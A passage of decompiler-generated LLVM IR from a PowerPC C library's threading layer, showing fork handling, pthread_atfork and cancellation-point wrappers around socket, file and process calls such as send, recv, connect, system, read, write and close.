  store i32 268513540, i32* @lr, align 4
  %v0_10013100 = call i32 @pthread_mutex_unlock()
  %v0_10013104 = load i32, i32* @r28, align 4
  store i32 %v0_10013104, i32* @r3, align 4
  store i32 268513548, i32* @lr, align 4
  %v0_10013108 = call i32 @pthread_mutex_unlock()
  %v0_1001310c = load i32, i32* @r27, align 4
  store i32 %v0_1001310c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013114.975 to i32), i32* @lr, align 4
  %v0_10013110 = call i32 @pthread_mutex_unlock()
  store i32 268513560, i32* @lr, align 4
  %v1_10013114 = call i32 @__pthread_once_fork_parent(i32 %v0_10013110)
  br label %dec_label_pc_1001311c

dec_label_pc_1001311c:                            ; preds = %dec_label_pc_100130ec, %dec_label_pc_10013100
  %storemerge.in = phi i32* [ @r31, %dec_label_pc_10013100 ], [ @r25, %dec_label_pc_100130ec ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r3, align 4
  store i32 268513568, i32* @lr, align 4
  %v0_1001311c = call i32 @pthread_call_handlers()
  %v0_10013120 = load i32, i32* @r26, align 4
  %v1_10013138 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10013004)
  ret i32 %v0_10013120

; uselistorder directives
  uselistorder i32 %v2_10013080, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 ()* @pthread_call_handlers, { 1, 0 }
  uselistorder label %dec_label_pc_1001311c, { 1, 0 }
  uselistorder label %dec_label_pc_100130ec, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_10013140 = call i32 @fork()
  ret i32 %v0_10013140

; uselistorder directives
  uselistorder i32 ()* @fork, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 24, i32* @r3, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268513640, i32* @lr, align 4
  %v0_10013164 = call i32 @malloc()
  store i32 268763136, i32* @r9, align 4
  %v3_1001316c = icmp eq i32 %v0_10013164, 0
  store i32 ptrtoint (i32* @global_var_100496b4.964 to i32), i32* %r27.global-to-local, align 4
  br i1 %v3_1001316c, label %dec_label_pc_100131d8, label %dec_label_pc_10013180

dec_label_pc_10013180:                            ; preds = %entry
  store i32 268513668, i32* @lr, align 4
  %v1_10013180 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496b4.964 to i32))
  %v0_1001318c = load i32, i32* @r30, align 4
  %v0_10013190 = load i32, i32* @r31, align 4
  store i32 268513692, i32* @lr, align 4
  %v4_10013198 = inttoptr i32 %v0_1001318c to i32*
  %v5_10013198 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451b0.965 to i32), i32* %v4_10013198, i32 %v0_10013190, i32 0)
  %v0_100131a4 = load i32, i32* @r29, align 4
  %v0_100131a8 = load i32, i32* @r31, align 4
  %v1_100131a8 = add i32 %v0_100131a8, 8
  store i32 268513716, i32* @lr, align 4
  %v4_100131b0 = inttoptr i32 %v0_100131a4 to i32*
  %v5_100131b0 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451b8.967 to i32), i32* %v4_100131b0, i32 %v1_100131a8, i32 1)
  %v0_100131b8 = load i32, i32* @r28, align 4
  %v0_100131bc = load i32, i32* @r31, align 4
  %v1_100131bc = add i32 %v0_100131bc, 16
  store i32 268513740, i32* @lr, align 4
  %v4_100131c8 = inttoptr i32 %v0_100131b8 to i32*
  %v5_100131c8 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451b4.966 to i32), i32* %v4_100131c8, i32 %v1_100131bc, i32 1)
  %v0_100131cc = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100131cc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100131d4.976 to i32), i32* @lr, align 4
  %v0_100131d0 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_100131d8

dec_label_pc_100131d8:                            ; preds = %entry, %dec_label_pc_10013180
  %v0_100131d8 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_10013180 ]
  ret i32 %v0_100131d8

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_100496b4.964 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100131d8, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10013214 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268513828, i32* @lr, align 4
  %v3_10013220 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013214)
  %v0_10013224 = load i32, i32* %r28.global-to-local, align 4
  %v0_10013228 = load i32, i32* %r27.global-to-local, align 4
  %v0_1001322c = load i32, i32* %r26.global-to-local, align 4
  %v0_10013230 = load i32, i32* %r25.global-to-local, align 4
  %v0_10013234 = load i32, i32* %r24.global-to-local, align 4
  %v0_10013238 = load i32, i32* %r29.global-to-local, align 4
  store i32 268513856, i32* @lr, align 4
  %v6_1001323c = call i32 @__libc_sendto(i32 %v0_10013238, i32 %v0_10013224, i32 %v0_10013228, i32 %v0_1001322c, i32 %v0_10013230, i32 %v0_10013234)
  store i32 %v6_1001323c, i32* %r29.global-to-local, align 4
  %v3_10013248 = load i32, i32* %stack_var_-56, align 4
  store i32 268513872, i32* @lr, align 4
  %v2_1001324c = trunc i32 %v3_10013248 to i8
  %v3_1001324c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1001324c, i32 0)
  ret i32 %v6_1001323c
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013280 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268513936, i32* @lr, align 4
  %v3_1001328c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013280)
  store i32 268513952, i32* @lr, align 4
  %v3_1001329c = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100132a8 = load i32, i32* %stack_var_-40, align 4
  store i32 268513968, i32* @lr, align 4
  %v2_100132ac = trunc i32 %v3_100132a8 to i8
  %v3_100132ac = call i32 @__GI_pthread_setcanceltype(i8 %v2_100132ac, i32 0)
  ret i32 %v3_1001329c
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100132e4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514036, i32* @lr, align 4
  %v3_100132f0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100132e4)
  store i32 268514056, i32* @lr, align 4
  %v4_10013304 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013310 = load i32, i32* %stack_var_-40, align 4
  store i32 268514072, i32* @lr, align 4
  %v2_10013314 = trunc i32 %v3_10013310 to i8
  %v3_10013314 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013314, i32 0)
  ret i32 %v4_10013304
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013348 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514136, i32* @lr, align 4
  %v3_10013354 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013348)
  store i32 268514152, i32* @lr, align 4
  %v3_10013364 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013370 = load i32, i32* %stack_var_-40, align 4
  store i32 268514168, i32* @lr, align 4
  %v2_10013374 = trunc i32 %v3_10013370 to i8
  %v3_10013374 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013374, i32 0)
  ret i32 %v3_10013364
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_100133b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268514244, i32* @lr, align 4
  %v3_100133c0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100133b4)
  %v0_100133c4 = load i32, i32* %r28.global-to-local, align 4
  %v0_100133c8 = load i32, i32* %r27.global-to-local, align 4
  %v0_100133cc = load i32, i32* %r26.global-to-local, align 4
  %v0_100133d0 = load i32, i32* %r25.global-to-local, align 4
  %v0_100133d4 = load i32, i32* %r24.global-to-local, align 4
  %v0_100133d8 = load i32, i32* %r29.global-to-local, align 4
  store i32 268514272, i32* @lr, align 4
  %v6_100133dc = call i32 @__libc_recvfrom(i32 %v0_100133d8, i32 %v0_100133c4, i32 %v0_100133c8, i32 %v0_100133cc, i32 %v0_100133d0, i32 %v0_100133d4)
  store i32 %v6_100133dc, i32* %r29.global-to-local, align 4
  %v3_100133e8 = load i32, i32* %stack_var_-56, align 4
  store i32 268514288, i32* @lr, align 4
  %v2_100133ec = trunc i32 %v3_100133e8 to i8
  %v3_100133ec = call i32 @__GI_pthread_setcanceltype(i8 %v2_100133ec, i32 0)
  ret i32 %v6_100133dc
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013424 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514356, i32* @lr, align 4
  %v3_10013430 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013424)
  store i32 268514376, i32* @lr, align 4
  %v4_10013444 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013450 = load i32, i32* %stack_var_-40, align 4
  store i32 268514392, i32* @lr, align 4
  %v2_10013454 = trunc i32 %v3_10013450 to i8
  %v3_10013454 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013454, i32 0)
  ret i32 %v4_10013444
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013488 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514456, i32* @lr, align 4
  %v3_10013494 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013488)
  store i32 268514472, i32* @lr, align 4
  %v3_100134a4 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100134b0 = load i32, i32* %stack_var_-40, align 4
  store i32 268514488, i32* @lr, align 4
  %v2_100134b4 = trunc i32 %v3_100134b0 to i8
  %v3_100134b4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100134b4, i32 0)
  ret i32 %v3_100134a4
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100134e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514552, i32* @lr, align 4
  %v3_100134f4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100134e8)
  store i32 268514568, i32* @lr, align 4
  %v3_10013504 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013510 = load i32, i32* %stack_var_-40, align 4
  store i32 268514584, i32* @lr, align 4
  %v2_10013514 = trunc i32 %v3_10013510 to i8
  %v3_10013514 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013514, i32 0)
  ret i32 %v3_10013504
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013548 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514648, i32* @lr, align 4
  %v3_10013554 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013548)
  store i32 268514664, i32* @lr, align 4
  %v2_10013564 = call i32 @__libc_write(i32 %arg1, i32 %arg2)
  store i32 %v2_10013564, i32* @r29, align 4
  %v3_10013570 = load i32, i32* %stack_var_-40, align 4
  store i32 268514680, i32* @lr, align 4
  %v2_10013574 = trunc i32 %v3_10013570 to i8
  %v3_10013574 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013574, i32 0)
  %v0_1001357c = load i32, i32* @r29, align 4
  ret i32 %v0_1001357c
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100135a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514744, i32* @lr, align 4
  %v3_100135b4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100135a8)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 268514760, i32* @lr, align 4
  %v3_100135c4 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_100135c4, i32* @r29, align 4
  %v3_100135d0 = load i32, i32* %stack_var_-40, align 4
  store i32 268514776, i32* @lr, align 4
  %v2_100135d4 = trunc i32 %v3_100135d0 to i8
  %v3_100135d4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100135d4, i32 0)
  %v0_100135dc = load i32, i32* @r29, align 4
  ret i32 %v0_100135dc

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100135fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514832, i32* @lr, align 4
  %v3_1001360c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100135fc)
  store i32 268514840, i32* @lr, align 4
  %v1_10013614 = call i32 @__libc_wait(i32 %arg1)
  %v3_10013620 = load i32, i32* %stack_var_-40, align 4
  store i32 268514856, i32* @lr, align 4
  %v2_10013624 = trunc i32 %v3_10013620 to i8
  %v3_10013624 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013624, i32 0)
  ret i32 %v1_10013614
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001364c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514912, i32* @lr, align 4
  %v3_1001365c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001364c)
  store i32 %arg1, i32* @r3, align 4
  store i32 268514920, i32* @lr, align 4
  %v1_10013664 = call i32 @__libc_tcdrain(i32 %arg1)
  %v3_10013670 = load i32, i32* %stack_var_-40, align 4
  store i32 268514936, i32* @lr, align 4
  %v2_10013674 = trunc i32 %v3_10013670 to i8
  %v3_10013674 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013674, i32 0)
  ret i32 %v1_10013664

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001369c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514992, i32* @lr, align 4
  %v3_100136ac = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001369c)
  store i32 268515000, i32* @lr, align 4
  %v1_100136b4 = call i32 @__libc_system(i32 %arg1)
  %v3_100136c0 = load i32, i32* %stack_var_-40, align 4
  store i32 268515016, i32* @lr, align 4
  %v2_100136c4 = trunc i32 %v3_100136c0 to i8
  %v3_100136c4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100136c4, i32 0)
  ret i32 %v1_100136b4
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100136f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515080, i32* @lr, align 4
  %v3_10013704 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100136f8)
  store i32 268515096, i32* @lr, align 4
  %v1_10013714 = call i32 @__libc_read(i32 %arg1)
  %v3_10013720 = load i32, i32* %stack_var_-40, align 4
  store i32 268515112, i32* @lr, align 4
  %v2_10013724 = trunc i32 %v3_10013720 to i8
  %v3_10013724 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013724, i32 0)
  ret i32 %v1_10013714
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_1001375c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515180, i32* @lr, align 4
  %v3_10013768 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001375c)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_10013778 = load i32, i32* %r29.global-to-local, align 4
  store i32 268515200, i32* @lr, align 4
  %v4_1001377c = call i32 @__libc_pwrite(i32 %v0_10013778, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_1001377c, i32* %r29.global-to-local, align 4
  %v3_10013788 = load i32, i32* %stack_var_-40, align 4
  store i32 268515216, i32* @lr, align 4
  %v2_1001378c = trunc i32 %v3_10013788 to i8
  %v3_1001378c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1001378c, i32 0)
  ret i32 %v4_1001377c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r25.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_100137c8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268515288, i32* @lr, align 4
  %v3_100137d4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100137c8)
  %v0_100137d8 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100137d8, i32* @r4, align 4
  %v0_100137dc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100137dc, i32* @r5, align 4
  %v0_100137e0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100137e0, i32* @r7, align 4
  %v0_100137e4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100137e4, i32* @r8, align 4
  %v0_100137e8 = load i32, i32* %r27.global-to-local, align 4
  store i32 268515312, i32* @lr, align 4
  %v5_100137ec = call i32 @__libc_pread64(i32 %v0_100137e8, i32 %v0_100137d8, i32 %v0_100137dc, i32 %v0_100137e0, i32 %v0_100137e4)
  store i32 %v5_100137ec, i32* %r29.global-to-local, align 4
  %v3_100137f8 = load i32, i32* %stack_var_-56, align 4
  store i32 268515328, i32* @lr, align 4
  %v2_100137fc = trunc i32 %v3_100137f8 to i8
  %v3_100137fc = call i32 @__GI_pthread_setcanceltype(i8 %v2_100137fc, i32 0)
  ret i32 %v5_100137ec
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_10013834 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515396, i32* @lr, align 4
  %v3_10013840 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013834)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_10013850 = load i32, i32* %r29.global-to-local, align 4
  store i32 268515416, i32* @lr, align 4
  %v4_10013854 = call i32 @__libc_pread(i32 %v0_10013850, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_10013854, i32* %r29.global-to-local, align 4
  %v3_10013860 = load i32, i32* %stack_var_-40, align 4
  store i32 268515432, i32* @lr, align 4
  %v2_10013864 = trunc i32 %v3_10013860 to i8
  %v3_10013864 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013864, i32 0)
  ret i32 %v4_10013854

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001388c = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_1001389c.977 to i32), i32* @lr, align 4
  %v3_10013898 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001388c)
  store i32 268515488, i32* @lr, align 4
  %v1_1001389c = call i32 @__libc_pause(i32 %v3_10013898)
  %v3_100138a8 = load i32, i32* %stack_var_-40, align 4
  store i32 268515504, i32* @lr, align 4
  %v2_100138ac = trunc i32 %v3_100138a8 to i8
  %v3_100138ac = call i32 @__GI_pthread_setcanceltype(i8 %v2_100138ac, i32 0)
  ret i32 %v1_1001389c
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100138e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515568, i32* @lr, align 4
  %v3_100138ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100138e0)
  store i32 268515612, i32* @lr, align 4
  %v3_10013918 = call i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013920 = load i32, i32* %stack_var_-40, align 4
  store i32 268515628, i32* @lr, align 4
  %v2_10013928 = trunc i32 %v3_10013920 to i8
  %v3_10013928 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013928, i32 0)
  ret i32 %v3_10013918
}

define i32 @open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001395c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515692, i32* @lr, align 4
  %v3_10013968 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001395c)
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 268515736, i32* @lr, align 4
  %v0_10013994 = call i32 @__libc_open()
  %v3_1001399c = load i32, i32* %stack_var_-40, align 4
  store i32 268515752, i32* @lr, align 4
  %v2_100139a4 = trunc i32 %v3_1001399c to i8
  %v3_100139a4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100139a4, i32 0)
  ret i32 %v0_10013994
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v2_100139d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515812, i32* @lr, align 4
  %v3_100139e0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100139d8)
  store i32 268515824, i32* @lr, align 4
  %v0_100139ec = call i32 @__libc_nanosleep()
  store i32 %v0_100139ec, i32* @r29, align 4
  %v3_100139f8 = load i32, i32* %stack_var_-40, align 4
  store i32 268515840, i32* @lr, align 4
  %v2_100139fc = trunc i32 %v3_100139f8 to i8
  %v3_100139fc = call i32 @__GI_pthread_setcanceltype(i8 %v2_100139fc, i32 0)
  %v0_10013a04 = load i32, i32* @r29, align 4
  ret i32 %v0_10013a04
}

define i32 @msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013a30 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515904, i32* @lr, align 4
  %v3_10013a3c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013a30)
  store i32 268515920, i32* @lr, align 4
  %v3_10013a4c = call i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013a58 = load i32, i32* %stack_var_-40, align 4
  store i32 268515936, i32* @lr, align 4
  %v2_10013a5c = trunc i32 %v3_10013a58 to i8
  %v3_10013a5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013a5c, i32 0)
  ret i32 %v3_10013a4c
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013a84 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516004, i32* @lr, align 4
  %v3_10013aa0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013a84)
  store i32 268516024, i32* @lr, align 4
  %v4_10013ab4 = call i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013abc = load i32, i32* %stack_var_-40, align 4
  store i32 268516044, i32* @lr, align 4
  %v2_10013ac8 = trunc i32 %v3_10013abc to i8
  %v3_10013ac8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013ac8, i32 0)
  ret i32 %v4_10013ab4
}

define i32 @lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013b00 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516112, i32* @lr, align 4
  %v3_10013b0c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013b00)
  store i32 268516128, i32* @lr, align 4
  %v3_10013b1c = call i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013b28 = load i32, i32* %stack_var_-40, align 4
  store i32 268516144, i32* @lr, align 4
  %v2_10013b2c = trunc i32 %v3_10013b28 to i8
  %v3_10013b2c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013b2c, i32 0)
  ret i32 %v3_10013b1c
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013b54 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516200, i32* @lr, align 4
  %v3_10013b64 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013b54)
  store i32 268516208, i32* @lr, align 4
  %v1_10013b6c = call i32 @__libc_fsync(i32 %arg1)
  %v3_10013b78 = load i32, i32* %stack_var_-40, align 4
  store i32 268516224, i32* @lr, align 4
  %v2_10013b7c = trunc i32 %v3_10013b78 to i8
  %v3_10013b7c = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013b7c, i32 0)
  ret i32 %v1_10013b6c
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013bb0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516288, i32* @lr, align 4
  %v3_10013bbc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013bb0)
  store i32 268516332, i32* @lr, align 4
  %v2_10013be8 = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_10013be8, i32* @r29, align 4
  %v3_10013bf0 = load i32, i32* %stack_var_-40, align 4
  store i32 268516348, i32* @lr, align 4
  %v2_10013bf8 = trunc i32 %v3_10013bf0 to i8
  %v3_10013bf8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013bf8, i32 0)
  %v0_10013c00 = load i32, i32* @r29, align 4
  ret i32 %v0_10013c00
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013c20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516404, i32* @lr, align 4
  %v3_10013c30 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013c20)
  store i32 268516412, i32* @lr, align 4
  %v1_10013c38 = call i32 @__libc_close(i32 %arg1)
  %v3_10013c44 = load i32, i32* %stack_var_-40, align 4
  store i32 268516428, i32* @lr, align 4
